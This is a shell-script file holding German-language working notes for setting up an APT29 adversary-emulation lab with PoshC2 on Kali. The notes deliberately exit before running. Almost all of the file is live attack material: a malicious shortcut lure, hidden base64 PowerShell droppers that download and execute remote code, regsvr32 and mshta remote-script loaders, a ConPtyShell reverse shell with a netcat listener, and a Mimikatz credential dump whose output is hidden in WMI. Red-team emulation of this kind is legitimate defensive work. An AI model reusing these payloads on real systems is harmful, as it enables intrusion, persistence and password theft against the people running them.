#!/bin/bash 

echo "Nice, you found this file!"
echo "However, it will and can not run all on its own."
echo "There are some parts that require interactivity"
echo "Other setup parts *must* be done manually, either by ui or ssh"
echo "This file is a reference on what to do in which order to setup the infrastructure"
exit 1



    Login as non-domain admin user

    Copy over the following files onto the Desktop of the initial victim:
        2016_United_States_presidential_election_-_Wikipedia.html
        make_lnk.ps1
        schemas.ps1

    Copy over MITRE-ATTACK-EVALS.HTML into the Documents folder of the initial victim

    Execute make_lnk.ps1 (Right click > Run with PowerShell), this will generate 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk

    Drag make_lnk.ps1 and schemas.ps1 to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)


    
    
files auf kali kopieren
ssh auf kali


4 terminals

terminal 1: poshc2 projekt erstellen
            poshc2 config anpassen
            poshc2 server starten

jetzt werden payloads etc generiert. diese sind allerdings evtl nicht komplett korrekt generiert worden, da evtl die ip des servers nicht eingebunden wurde. dafür müssen adressen angepasst, base64 encodierte teile entschlüsselt, angepasst und wieder encoded werden. anzupassen bzw zu überprüfen sind hier die teile, die in die exploit ps1 files geschrieben werden sowie die payload.bat, rg, cs und alle anderen base64 encoded dateien und urls die aufgerufen werden


Payloads/droppers using powershell.exe:
=======================================

Raw Payload written to: /var/poshc2/apt29/payloads/payload.txt
Batch Payload written to: /var/poshc2/apt29/payloads/payload.bat

powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADkAMAAwADEALwBzAHQAYQB0AHUAcwAvADkAOQA1ADUAOQA4ADUAMgAxADMANAAzADUANAAxADIANAA4AC8AcQB1AGUAcgB5AD0ALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA=

regsvr32 /s /n /u /i:http://9001/status/995598521343541248/query=/_rg scrobj.dll

mshta.exe 'vbscript:GetObject("script:http://9001/status/995598521343541248/query=/_cs")(window.close)'

HTA Payload written to: /var/poshc2/apt29/payloads/Launcher.hta


            
            
terminal 2: als user auf poshc2 server einloggen            

terminal 3: cd var/posh/apt29/payloads
            python3 -m http.server -b 10.0.1.17 9002

in spice console auf opfer: link ausführen            
effektiv führt das über umwege payload.bat aus. das generiert ein implant, der in terminal 2 selektierbar wird. 
jetzt können die weiteren schritte wie in emulation plans ausgeführt werden

load-module /var/poshc2/apt29/payloads/timestomp.ps1

            
            
terminal 4: python3 -m http.server -b 10.0.1.17 8080
            
            
            
            
            
            
            
            

powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADkAMAAwADEALwBzAHQAYQB0AHUAcwAvADkAOQA1ADUAOQA4ADUAMgAxADMANAAzADUANAAxADIANAA4AC8AcQB1AGUAcgB5AD0ALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA=







└─$ cat /var/poshc2/apt29/payloads/payload.bat
powershell -exec bypass -Noninteractive -windowstyle hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEgANABzAEkAQQBQADIAbQBnAG0AWQBDAC8ANQAxAFkAVwAzAFAAaQB1AEIASgArAHoANgAvAFEAdQB2AHkAQQBKADkAaABjAGsAcABBAEwAUgBkAFUAbQBKAE4AbAB3AFoAawBnAG8AWQBHAGEAcgBoAGsAcAB0AEMAVgB1AEEAZwByAEUAOQBzAGgAegBDADUAdgBEAGYAVAA3AGYAawBHADcAbAB0AHoAagBvAFAAeABxADMAdQAxAHEAZQArAEsANQBQAFIASgBwAFoAcwA1AGQAdwB5ADYAWQB5AFkAZQBPAFEAdQBHADQAUQA4AGsASAAwAGEAMABEAGsAVAA5ADIAZABuAFMARwBXAGkAeQA0AFQAawBNACsANQBTAHkAWAA1AFEAbgAzAHQAVQA4AGoARABvAFUAdAArAGYAVQBuAGQASgBPAHUAVABaAGwAQwBKAGgAMgB6ADMAVABtADMAVgArAHIAeABpAG4AOQBYAHIARABxAEwANwAxAHMAdgBiAE0AUgBjAGMAdwA5AHMAegBZAFYAYQA5AEUAKwBEAEYASwBMAEsAUwBNAHoAbQBxADEAUgB2AFAAWQBxAGMATQBmADgAbQBlAGsAMAA2AGIAVABhAEoAMABBADgAZQBnAHQANABtAEcASgBxAEMAUwBkAHgAagBIAHUANABvAEwAbQBqAGwARwBqAG4AagBwAFcATQBMACsAawBrAHQAWQBHAHcANwB2AEwAMgByAGoAZgA5AFQAawBMAFoASwAxAFYATwB6AGsAKwBhAE4AVQBRAFQARQBjAEIAbQBkAFQAdgA5AC8AWgBtAFMAZQBEAGkANgBVAGgAWABNAEQAaQB1AGYAYwA1AGkAYgBRADMAdgBiAHYAcgBBAFgARQBrAHEANQBwAEoAdABxAG0AYgB2AGgALwBXADgAUgArAEMAUgBZAGcAUABuAHAAMgBDAEYAVwA3AGEAMgBVAHkAWQBqAE4AZQB5AEkAQQBSAEEAdQBOADAANQBYAGIAQwBJAFoAegBnAFcATgBGAGgAdABuAHkAQgA4AEMAagB6AEkALwBWAFcAdwBvAFAAVgBzAEMANQBuAFUAWAAvADYAOAB1AHcASwBlAC8ATQAvACsASgA4AEoARgA3AFQAQgBoAGIAcABkAFcAawBUAGoALwAwAEcARwBpAGMAZgBLAGkAbQB5ADYATQBGAEUAOABnAEsAVAB1ADkAZQBkAEQAUABoAEEAZgBVADgATQBOADgALwB5AHEAZAA4AHEAWQBLAGYAVABJAFIAeABwAHUATABDAEQAOQAzAGwAaQBQACsATgBJAEIAcgBOAGsANAB6ADgAbABXADEAUwBZAHYATwBvAHAAWQBoADgAQgBzAFkARgB1ADYAcQBQADUAegBMAEoAbQBUAE0ANQAzAGsAUwBzAFkAagBtADMAZABNAFcASQB6AFgANgBCAFcAYQBTAEEASABZADIAVQBIAFQAVAAyAGYAcABSAGcAZABzAE0AQQBBAGwAYwBDAG0ARwBzAFIAcgBpADUAbwB6AEYAcQBIAFcAawBMAHQAbwBhADMARAAvAEoAagB0AGkAcwBPAGEAWAB0AG8AVwArADQATwAvAFgAMgBFAEMAMgB1AGQAQQB3AFQARQAvAGkAUQBxADMAZQBRAE8AVwBWAG8AQwByAFoAVwBBAG0AMwBkAHUAVwBnAHYAVQBxAGMATgBFAGIAdAB0AGEAVgB4AFcAZwBTAHAARABGAHEAVABrAHMAWQB4AHUAeABKAE8AaQBBAFEAbwBzAE0AQQB5AGYAZgB4ADkAWQBuAHoAQgA1AE0AWABHADgAbgBpAEMAZwBxAGwATwA0AEQATQBlADAAbQBBACsAagBVAFgATwBoAEIAUQBhAHMAWQBVAFIAaQBnAHEAcQBZADQAWgByAGoASgBuAEwARwBnAFEAegAwAEsAeAB1AHUAWQBCADkAVgBWAEEAVgBNAHgAcABsAGQAUwByAEEATQAzADUAeABvAEsANQBYAEcAaQBKAHkAUgBSAFEAVABPADcAdgBpAFIAbABwAHgAZQBDAFYAZgBkAEMAagBGADEAOQBaAGMAUgB6AHUAMgBqAEMAeQBkAHMAeAB5AHkAZAA0AHkAQwB3AHYAYwB0ACsAegB5AGsAVwA5AFEAUgBFAHYAbwBLAEoAbABPADYAbwA3AFQATwBMAHIALwBuAEsAVgBRAFMAbgBOADYAWgBXAHUAbAA2AEEAcAByAEoAYgBqAHEAdgBXAHUAdABSAHEAdABrAEwAbQBMAEQAdAA3AFYAagBsAHYAYwBjAG0AeAA3AGkARQArAGYAOABwAEMAWQB6AHMAUQBBAGsAWAAxAFUAbQA3AG8ASwBLACsANwBwAGwANwBaAG8AZABPAE8AMAAvADIAZABSAFYAZABSAGEAcwAzAGcAMwBEAEoAVwBjAFcASwBSAFYATQBEAGYAeQBqAHYAcQBPAHIARABKAFEAegBHAGIAcQBoAGoAMwA3AFMAMwBMAHQAMABUAEUAQwBNAEEAegA4AG0AOQBqAFEAVQAvADgAVABVAGEASAB5AE8AcgBkAG4AZQByAGMAbgBxAFMANgBXAG0AdQB3AGkASgBjAFIANABRAEoAZwBUAG8AQwBWADEAUQBJAFoAaAAzAFIAcwB5AC8AagBIAEoANgBvAHEATQByAGEAQQBkAG8AUABGAEEAYQByAHMARwBiAEYARQByADUAQgBoADYANwAzADcAYwA5AHoANwBEAGEAQgBlAGMARQBPAGkAcQBUAGYASQBYAGIARAA2AGkASQAyAGQAVQBUAGQAVwBYAEYAOQBLAHAAbABpAGEAbwBaAEoATAA2AGYAeQBTADMAZgBsAHoATwBhAHAANgBlAG4AZAByADEAaABxADgAYgA3AG4AZwBaAGQAeAA0AGoAdABRADUAQgA2ADQAQgB6ADIAeABHAFcASwBQAG8AbQBaAEMATABDAG0AZABZAGkAaABqADIAVgBHAE4ASQA3AFgAbwBmAEQASwBKAEIARQArAGIAYQBCAHgAbABrAGgAcgBkADcAZAAzAGwAZQBZAEwAQwBBAGoAZABlAFAAWAB1AEIAUQBRAEkAWgBSAHAANABwAEEATABaAEcAMABOAGcAeABoAEIAQgBrAGsANQA5ADUAbgBTAC8ARABYAC8AbwBiADYAZABQAEgAOABEAGEAOQBsAHkAUwBKAGcAUQBiADEATQBXADEANgA5AHcAdwBDAG4AMAB1AGQAcwA0ADkAcgAyAEwAYwBoAEwARwBFADQAeQAxAEsARgBaAFQAUABRAEwAZgAxAEQASwBPAEcANABKAEUAOABpAHoAdABxAFUASQBoAGgAVQBqAEIAeAA0AFYATwB6AFEAVAB1AFgAZABsACsASQBaAC8AMwAxAEoAWgBEAHYAWQBEAHIANwBmAEEANQBLAHcAUABUADkAOABHAC8AdQArADcAUgAyADUATgBSAEoANQBVADgAZQBlAE8ARQA2AEoAcgBkAGoAZwBxAE4ASwBtAHcAQwBoAGQAZABnAG0AVAA2ADEARABpADUAeABIAGsAYwAvAEEAUgBGACsANQByAEIAMABkAEgARABzAEgATABWAEwANQBlAGoAUAB1AGYANgBzAFMAbgB5ADgAWgBwAEoAUwA3AEQAQwAzAFMAWABVAEQASwBzAHQAbwBKAGoAagBvAEgAcAB5AGYASABUAHEAUABaAEoAQwBNADYAbwA0AEsAbgBZAG0AbgByAGUAWQBWAHIAeQBHAFoATQB3AEYAaABRAE4AVgBJAE8AWgBmAHYATQBoAFYAbAB1AG0AdQB2AG8ASQB3AGMATwBrAEwAMgBRAHEAcQBxAHgAcgB4AHgATwBlAGUAQQBvAGwAKwBaAEIAawA2AHMAZgBqAEUAWgBZAEsAMwBVAEYARwBvAGUAMgBTAGsARwBXAGwAdQBjAGkAeAB1AHoAegBlAE8AQgBUAEgAbQBBAGQAVQBzAG4AagBzAGoAVABxAG8AZQBlADYAawBHADgAeABhAEEAawBBAFoAYQBoAFIAeABoAHIAbABTAHAAVwBQAEYAZABqAGUAbwBZAGsATQBWADIAcABNAGQAUQBZAGoASwBMAGMAZQBFAEQAbgAxAGkAOQBDAHUASQBwAFoAMgBkAG0AaQBuAFkARQBIAFYAKwBUAFoAWgBHAGMAQgA0AEkAcwAvAEsAcQB1AEQAZwBTAHoAYQBqAGkAUwA5AGYAeQBLAEEAdAAyAHEAUQBJAEMAMgBVAHMAWABGAGgASAA3AFYAeABGAHYAdgBxAHgAbQBsADAAbABMADkARQBCAHYAVQBUAEoATQBDAG8ASAB1AEYAbQBwAGYAUgBVAEIAawA1AEkAcgBiAHkAQwBTAGgAKwB4AFgAdwBtAEsAcABXAFgARABvAFUANQBKAFYARwBHAEYAWQBqAEQAbgBYAHUAKwB5AGsAaABkAHUAdwBpAGwAUAB0ADEAUABrACsAbwBPAGYAMgBBAEQAbwBCAEUAeABWAFQAQgBRAFEAVQAxAEMAcgBjAEEAbgBLAEgANQA4AG0ASAB5AC8AdQA0AHYARQB0ADMAMQBjAEkATwBiAGQARQBCAEIAWgByAGkASgBtADgATgBuAHIAQgBoADQAUABLAEkAKwBrADYAYQBVAGoAMQBsAEMAcgBtAEIAVQAwAEQASgA3AFcASgBGAEQAbQBUAFcAVgBOACsASgA2AFAAZQAxADUAUQBTAHcAWgBwAEwATgBRAHYATgBQAEEAYgBsAEkAdQBDADkANwB3AFQARAAwAHMAUwBLAGYAZQB5AHMAZQA4AEYAZwBLAEMAagAwACsATAA1AGwAdQBXAGwAaABWAGQAdwBEADMAdQBtAEIAdQBZAG4AUABNAEYAdQA1AFoAVABrAHIAQgBpAGIASgBJAEsAdwBqAFEAWABxAHoAMQBWAGcAQwBMAEIAVgBXAE4AdwBmAFgAbQBpADcASABGAHEATgBJAGYAYQBVAEcAQwA3AHYAcABzAEoAaAAyAEYAMwBjAEcAdAA5AG0ARQAxADcAVwBQAFAAUwBoAGsATABIAHMAKwBLAFAATQBXAGgAMQBkAFIARQBOADEAeABGAGkAZABRAEwAbABtAGwAWQB6ADYAbgAyAHAATABNAGoAcwAwADIARABJAGUAdwBZAE8AZAAyAEQAWgBPAE4AQgAyADAAegBhAHIAegBSAHAAQwBwAFQAWAA3AHQAVgBvAGQARABmADgANgAzAHoAWQB2AGUAbQBOAHIANwByAGoANwA4AE8AcgBOAHAANgA1AG4AVgB1AGwAZgBXAEMAVQByAGwAUgBSADEASABrAHgAMQB0AG8ANABTAHkAVQAvAFcAOQAzAGwAKwBPAEwAbgA0ADMAaAB4AE0ANwAvAHgAVwB2AFQAaABQAC8AdQBuADMAMwB2ADEAcAB5AFAAZgAvAHoAYQBlADkAdgBjAHYANQA5AGYATAAwAGYAcABoAE4AVAByAHMARQBEAHMASgBBAEcAaAB4AHQAUQBLAGQAeAB0AFYAdwBlAEQAZgBNAHkAdgBjAEsAUQB6AGgAUwBFAFoAegA1AHAASgBoAGMAYgBCADMALwA0AEoAbgBJAGMAcwBDAC8AZwBSADkAUwBMADAANQBuAG8AQwB5AEMAMAB3AGoAQgBLAEgAcwB4AGIAdgA0AEwAdQBEAEIAbgA3AG0AQQBxAFYAVwBwAG8AMQBOAGcASQBqAEMAOQB3AEkAZgBoAGkAWQBBACsATQAvAGsAcwA0AGUAOQByAHUAcABLAFIATwB4AHYAeQBtAFUAdgBsAHQAbwB2AEYAQwBPAFAAYgBpAFcAMgBqACsAZAArAEoAcQBGAGMAbABOAEIAZABxAEEATAB0AEsALwBUAGEANgBDAFIAeQA3AEMAQQBPAHMAbQB6AG4AcgBnAHoAawB2AGwAVABvAHgAQgBuAEIAWQBsAC8ASQA1AFIAbwBIAHcATAB3AGsAYwB3AG0AWQBpAGcAWABaAHAANwBZAEcAcABsADEARgAyAG8AWQBrAEEANAAyAEIANwB2ADEAVgBZAGgAWQBVAEsAZQBzAEMAZgBNAEoAUwBvAEUAeABZAFQAdABJAGUARgB1AHAAaQBUAGkAcQBoAEsAdwA5AG4ATAArAFkAbABiAE0AbgBuAEwATgBVAGQAeABFADMAZgBWAGgAaABKAGwATgB0AFAAYgA3AG4ASAA5AEwAOABwADgAdgA1AHoAaAA4ADEAcABEAEUAegBBADQAVABDAGIARQBLAHQAeABRAGMANgBQAEIAZgBBAEwAbAAwAGUAaQA0AHcAcgArAG4AegBGAFoAZQBkAGcALwBvAGUARABoAFcAcQA2AFcAVwBWAG4ASABJAEoAeAAyAG4AVgAxAGUAZAA2AHcAVABGAEQAawBTAEgAdABnAEUAcABRAEQAUwA3ADEAcwBoAGsAMAB1AFoATwB2AE4AOQByADUAMgBxAEIAdwBQAEQANABqAFMAUQBWAEUAbABNADkAWQBwAEgAYwByAGwASwBSADcANgAvAGMAWABrAHMAMgBzAEEARgBoAGQASQBQAFYAMgBxAGIAcgB0AC8AdwBEAE0AbgAwAGMARwA2AHgARQBBAEEAQQA9AD0AJwApACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAA==  


    
auf kali mit nc -lvp 9001 lauschen

conpty shell ->
server/kali: stty raw -echo; (stty size; cat) | nc -lvnp 9003

windows:
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.1.17 9003

-> reverse shell 


poshc2 auf 10.0.1.17 port 9001 konfigurieren


payload.bat funktioniert auch mit poshc2
-> auf kali 
cd /var/poshc2/apt29/payloads/; python3 -m http.server -b 10.0.1.17 9002 
für webserver aufmachen, exposed das payloads verzeichnis
von dort kann payload.bat runtergeladen werden
curl 10.0.1.17:9002/payload.bat | powershell



irgendwas ist mit der windows workstation maschine jetzt los, make link erzeugt nicht mehr das richtige. neu aufsetzen, einrichten und dann image draus generieren?

cleanup:
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WebCache" /f
del %appdata%\Microsoft\kxwn.lock 




posh c2 server starten
der powershell base64 encoded string ist nicht komplett richtig, hier fehlt die serveradresse -> in decoder werfen, 10.0.1.17:9001 vor adsense in url einfügen -> base64 encoden -> das in schemas.ps1 einfügen


WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAC8AYQBkAHMAZQBuAHMAZQAvAHQAcgBvAHUAYgBsAGUAcwBoAG8AbwB0AGUAcgAvADEANgAzADEAMwA0ADMALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA=

-> 

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('http:///adsense/troubleshooter/1631343/_rp')));IEX $MS

-> 

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('http://10.0.1.17:9002/adsense/troubleshooter/1631343/_rp')));IEX $MS

das $MS noch wegmachen

-> 

WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAxAC4AMQA3ADoAOQAwADAAMgAvAGEAZABzAGUAbgBzAGUALwB0AHIAbwB1AGIAbABlAHMAaABvAG8AdABlAHIALwAxADYAMwAxADMANAAzAC8AXwByAHAAJwApACkAKQA7AEkARQBYAA==



das downloaded einen encoded string, der effektiv der inhalt von payload.txt ist.
-> das wird dann in den link eingebettet und ausgeführt, was in posh -u einen implant spawnt, eine reverse shell. dort führt man dann weitere schritte aus

regsvr32 /s /n /u /i:http://10.0.1.17:9002/adsense/troubleshooter/1631343/_rg scrobj.dll

schreibt das dinge in eine dll? ist damit die dll gemeint in der apt29 anleitung?

mshta.exe 'vbscript:GetObject("script:http://10.0.1.17:9002/adsense/troubleshooter/1631343/_cs")(window.close)'



auf windows workstation link file ausführen


push -u crashoverride
auf implant von reverse shell connecten 
 load-module /var/poshc2/apt29/payloads/timestomp.ps1
 
 



New-Object System.Net.WebClient; $wc.DownloadFile("http://10.0.1.17:8080/m","m.exe"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = "m.exe"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @("privilege::debug","sekurlsa::logonpasswords","exit"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = ""; ForEach ($line in $($output -split "`r`n")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); $EncPws =[Convert]::ToBase64String($PwBytes); Set-WmiInstance -Path \\.\root\cimv2:Win32_AuditCode -Argument @{Result=$EncPws}

-> 

TgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMQAuADEANwA6ADgAMAA4ADAALwBtACIALAAiAG0ALgBlAHgAZQAiACkAOwAgACQAUAByAG8AYwBlAHMAcwBJAG4AZgBvACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAgACQAUAByAG8AYwBlAHMAcwBJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACIAbQAuAGUAeABlACIAOwAgACQAUAByAG8AYwBlAHMAcwBJAG4AZgBvAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABFAHIAcgBvAHIAIAA9ACAAJAB0AHIAdQBlADsAIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAIAA9ACAAJAB0AHIAdQBlADsAIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlACAAPQAgACQAZgBhAGwAcwBlADsAIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwAuAEEAcgBnAHUAbQBlAG4AdABzACAAPQAgAEAAKAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAsACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAsACIAZQB4AGkAdAAiACkAOwAgACQAUAByAG8AYwBlAHMAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzADsAIAAkAFAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQASQBuAGYAbwAgAD0AIAAkAFAAcgBvAGMAZQBzAHMASQBuAGYAbwA7ACAAJABQAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAgACQAbwB1AHQAcAB1AHQAIAA9ACAAJABQAHIAbwBjAGUAcwBzAC4AUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAIAAkAFAAdwBzACAAPQAgACIAIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABsAGkAbgBlACAAaQBuACAAJAAoACQAbwB1AHQAcAB1AHQAIAAtAHMAcABsAGkAdAAgACIAYAByAGAAbgAiACkAKQAgAHsAaQBmACAAKAAkAGwAaQBuAGUALgBDAG8AbgB0AGEAaQBuAHMAKAAnAFAAYQBzAHMAdwBvAHIAZAAnACkAIAAtAGEAbgBkACAAKAAkAGwAaQBuAGUALgBsAGUAbgBnAHQAaAAgAC0AbAB0ACAANQAwACkAKQAgAHsAJABQAHcAcwAgACsAPQAgACQAbABpAG4AZQB9AH0AOwAgACQAUAB3AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAQgB5AHQAZQBzACgAJABQAHcAcwApADsAIAAkAEUAbgBjAFAAdwBzACAAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABQAHcAQgB5AHQAZQBzACkAOwAgAFMAZQB0AC0AVwBtAGkASQBuAHMAdABhAG4AYwBlACAALQBQAGEAdABoACAAXABcAC4AXAByAG8AbwB0AFwAYwBpAG0AdgAyADoAVwBpAG4AMwAyAF8AQQB1AGQAaQB0AEMAbwBkAGUAIAAtAEEAcgBnAHUAbQBlAG4AdAAgAEAAewBSAGUAcwB1AGwAdAA9ACQARQBuAGMAUAB3AHMAfQA=
